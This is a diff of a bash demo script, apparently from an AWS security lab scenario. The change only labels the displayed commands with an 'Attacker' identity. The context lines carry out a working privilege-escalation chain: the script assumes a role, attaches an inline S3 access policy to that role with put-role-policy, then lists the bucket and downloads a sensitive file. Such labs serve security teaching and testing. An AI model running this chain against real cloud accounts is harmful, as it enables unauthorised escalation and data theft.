@@ -22,12 +22,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -72,7 +74,7 @@ cd - > /dev/null  # Return to scenario directory
 
 # Step 2: Verify identity as user
 echo -e "${YELLOW}Step 2: Verifying identity${NC}"
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_IDENTITY"
 
@@ -86,7 +88,7 @@ echo -e "${GREEN}✓ Verified identity as $STARTING_USER${NC}\n"
 echo -e "${YELLOW}Step 3: Assuming starting role${NC}"
 echo "Role ARN: $STARTING_ROLE_ARN"
 
-show_cmd "aws sts assume-role --role-arn \"$STARTING_ROLE_ARN\" --role-session-name \"iam-005-demo-session\""
+show_cmd "Attacker" "aws sts assume-role --role-arn \"$STARTING_ROLE_ARN\" --role-session-name \"iam-005-demo-session\""
 ASSUME_ROLE_OUTPUT=$(aws sts assume-role \
     --role-arn "$STARTING_ROLE_ARN" \
     --role-session-name "iam-005-demo-session")
@@ -101,7 +103,7 @@ echo -e "${GREEN}✓ Successfully assumed role $STARTING_ROLE${NC}\n"
 # Step 4: Verify we don't have S3 bucket access yet
 echo -e "${YELLOW}Step 4: Verifying we don't have S3 bucket access yet${NC}"
 echo "Attempting to list S3 bucket contents (should fail)..."
-show_cmd "aws s3 ls s3://$BUCKET_NAME/"
+show_cmd "Attacker" "aws s3 ls s3://$BUCKET_NAME/"
 if aws s3 ls s3://$BUCKET_NAME/ &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have bucket access already${NC}"
 else
@@ -135,7 +137,7 @@ POLICY_DOCUMENT=$(cat <<EOF
 EOF
 )
 
-show_attack_cmd "aws iam put-role-policy --role-name \"$STARTING_ROLE\" --policy-name \"EscalatedS3Access\" --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":[\"s3:ListBucket\",\"s3:GetObject\",\"s3:PutObject\"],\"Resource\":[\"arn:aws:s3:::${BUCKET_NAME}\",\"arn:aws:s3:::${BUCKET_NAME}/*\"]}]}'"
+show_attack_cmd "Attacker" "aws iam put-role-policy --role-name \"$STARTING_ROLE\" --policy-name \"EscalatedS3Access\" --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":[\"s3:ListBucket\",\"s3:GetObject\",\"s3:PutObject\"],\"Resource\":[\"arn:aws:s3:::${BUCKET_NAME}\",\"arn:aws:s3:::${BUCKET_NAME}/*\"]}]}'"
 aws iam put-role-policy \
     --role-name "$STARTING_ROLE" \
     --policy-name "EscalatedS3Access" \
@@ -153,14 +155,14 @@ echo -e "${YELLOW}Step 6: Verifying S3 bucket access${NC}"
 echo "Target bucket: $BUCKET_NAME"
 echo "Listing bucket contents..."
 
-show_attack_cmd "aws s3 ls s3://$BUCKET_NAME/"
+show_attack_cmd "Attacker" "aws s3 ls s3://$BUCKET_NAME/"
 aws s3 ls s3://$BUCKET_NAME/
 echo -e "${GREEN}✓ Successfully listed bucket contents!${NC}\n"
 
 # Step 7: Download sensitive data
 echo -e "${YELLOW}Step 7: Downloading sensitive data${NC}"
 DOWNLOAD_FILE="/tmp/iam-005-sensitive-data.txt"
-show_attack_cmd "aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt $DOWNLOAD_FILE"
+show_attack_cmd "Attacker" "aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt $DOWNLOAD_FILE"
 aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt $DOWNLOAD_FILE
 
 echo -e "\n${GREEN}✓ Successfully downloaded sensitive file${NC}"
